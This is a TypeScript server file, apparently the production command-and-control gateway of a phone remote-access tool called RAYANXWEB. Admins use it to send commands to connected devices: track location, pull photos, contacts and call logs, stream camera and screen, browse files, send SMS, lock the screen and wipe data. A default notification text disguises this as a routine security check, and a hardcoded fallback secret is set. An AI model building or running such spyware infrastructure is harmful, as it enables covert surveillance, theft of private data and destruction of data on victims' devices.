import express, { Request, Response } from "express";
import { createServer } from "http";
import { Server, Socket } from "socket.io";
import cors from "cors";
import * as dotenv from "dotenv";
import { AdminCommandPayload, ExecutionPayload, ClientTelemetryPayload } from "./types";

// Muat konfigurasi variabel lingkungan (.env)
dotenv.config();

const app = express();

// Keamanan Lintas Batas Domain (CORS Production)
const allowedOrigins = [
  "https://rayanxweb-dashboard.vercel.app",
  "http://localhost:3000"
];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.indexOf(origin) !== -1) {
      callback(null, true);
    } else {
      callback(new Error("Akses diblokir oleh kebijakan CORS Produksi RAYANXWEB"));
    }
  }
}));

app.use(express.json());

// In-Memory Storage Sesi Real-time
const connectedClients = new Map<string, string>(); // TargetId -> SocketId
const activeAdmins = new Set<string>();             // Daftar SocketId Admin

// REST Endpoint: Pemeriksaan Kesehatan Server (Railway Health Check)
app.get("/", (req: Request, res: Response) => {
  res.status(200).json({
    status: "ONLINE",
    environment: "PRODUCTION",
    gateway: "RAYANXWEB_CORE_V2",
    nodesOnline: connectedClients.size,
    timestamp: Date.now()
  });
});

const httpServer = createServer(app);
const io = new Server(httpServer, {
  cors: {
    origin: allowedOrigins,
    methods: ["GET", "POST"],
    credentials: true
  },
  transports: ["websocket", "polling"],
  pingTimeout: 60000,
  pingInterval: 25000
});

// MIDDLEWARE: Validasi Token Enkripsi Sebelum Handshake Diproses
io.use((socket: Socket, next) => {
  const authKey = socket.handshake.headers["x-auth-token"] || socket.handshake.auth?.token;
  const masterSecret = process.env.GATEWAY_PRODUCTION_SECRET || "814069";

  if (authKey === masterSecret) {
    return next();
  }
  console.log(`[SECURITY WARN] Koneksi ilegal diblokir. IP: ${socket.handshake.address}`);
  return next(new Error("Authentication failure: Invalid Master Token."));
});

// LOGIKA PIPELINE INTI WEBOSCKET
io.on("connection", (socket: Socket) => {
  const clientType = socket.handshake.query.type as string; 
  const nodeId = socket.handshake.query.nodeId as string;

  if (clientType === "admin") {
    activeAdmins.add(socket.id);
    console.log(`[ADMIN CONNECTED] ID: ${socket.id} | Total Admin: ${activeAdmins.size}`);
    socket.emit("gateway_status", { clientsConnected: connectedClients.size });
  } 
  
  if (clientType === "client_device" && nodeId) {
    connectedClients.set(nodeId, socket.id);
    console.log(`[NODE CONNECTED] Node terdaftar: ${nodeId} -> Socket: ${socket.id}`);
    io.to(Array.from(activeAdmins)).emit("node_status_change", { nodeId, status: "ONLINE" });
  }

  // PIPA 1: Menerima Instruksi Dashboard, Memetakan Ke 17 Parameter Fitur, & Teruskan ke Klien
  socket.on("admin_command", (payload: AdminCommandPayload) => {
    const { targetId, command, options } = payload;
    const targetSocketId = connectedClients.get(targetId);

    if (!targetSocketId) {
      socket.emit("command_error", { error: `Gagal mengirim: Node ${targetId} Offline.` });
      return;
    }

    let executionPayload: ExecutionPayload = {
      action: command,
      params: {},
      issuedAt: payload.timestamp
    };

    switch (command) {
      case "lacak":
        executionPayload.params = { highAccuracy: true, timeout: 15000 };
        break;
      case "notifikasi":
        executionPayload.params = { 
          title: options?.title || "Notifikasi Sistem", 
          body: options?.body || "Pemeriksaan integritas keamanan berkala." 
        };
        break;
      case "gallery":
        executionPayload.params = { maxCount: 100, sortBy: "date" };
        break;
      case "kontak":
        executionPayload.params = { fields: ["name", "phone"] };
        break;
      case "panggilan":
        executionPayload.params = { limit: 50 };
        break;
      case "live_camera":
        executionPayload.params = { cameraType: options?.cameraType || "back", quality: 80 };
        break;
      case "app_mgmt":
        executionPayload.params = { includeSystemApps: false };
        break;
      case "wallpaper":
        executionPayload.params = { imageUrl: options?.imageUrl || "default.png" };
        break;
      case "senter":
        executionPayload.params = { state: options?.state === "ON" };
        break;
      case "kunci_layar":
        executionPayload.params = { message: "Perangkat terkunci otomatis." };
        break;
      case "putar_video":
        executionPayload.params = { videoUrl: options?.videoUrl || "", autoPlay: true };
        break;
      case "file_target":
        executionPayload.params = { rootPath: options?.path || "/" };
        break;
      case "sms":
        executionPayload.params = { recipient: options?.phone || "", messageText: options?.message || "" };
        break;
      case "live_screen":
        executionPayload.params = { fps: 15, resolution: "720p" };
        break;
      case "lock_pro":
        executionPayload.params = { restrictNavigation: true };
        break;
      case "cam_monitor":
        executionPayload.params = { flash: false, targetCamera: "back" };
        break;
      case "reset_data":
        if (options?.secureToken !== process.env.EMERGENCY_WIPE_TOKEN) {
          socket.emit("command_error", { error: "Akses Ditolak: Token Keamanan Wipe Salah!" });
          return;
        }
        executionPayload.params = { wipeReason: "Remote wipe triggered by administrator." };
        break;
      default:
        socket.emit("command_error", { error: "Perintah tidak didukung oleh arsitektur matriks." });
        return;
    }

    io.to(targetSocketId).emit("execute_action", executionPayload);
    console.log(`[DISPATCH] Perintah [${command}] diarahkan ke Socket Klien: ${targetSocketId}`);
  });

  // PIPA 2: Menerima Telemetri dari Klien untuk Disebarkan ke Seluruh Admin Aktif
  socket.on("client_telemetry_data", (payload: ClientTelemetryPayload) => {
    io.to(Array.from(activeAdmins)).emit("receive_telemetry", {
      from: payload.nodeId,
      payload: payload.data,
      receivedAt: Date.now()
    });
  });

  // PENANGANAN DISKONEKSI (Pembersih Sampah Memori Sesi Klien)
  socket.on("disconnect", () => {
    if (activeAdmins.has(socket.id)) {
      activeAdmins.delete(socket.id);
      console.log(`[ADMIN DISCONNECTED] ID: ${socket.id} | Sisa Admin: ${activeAdmins.size}`);
    }

    if (clientType === "client_device" && nodeId) {
      connectedClients.delete(nodeId);
      console.log(`[NODE DISCONNECTED] Node keluar: ${nodeId}`);
      io.to(Array.from(activeAdmins)).emit("node_status_change", { nodeId, status: "OFFLINE" });
    }
  });
});

// Jalankan Alokasi Port Produksi Server
const PORT = process.env.PORT || 8080;
httpServer.listen(PORT, () => {
  console.log(`[SERVER ACTIVE] RAYANXWEB Production Gateway mengudara di Port: ${PORT}`);
});
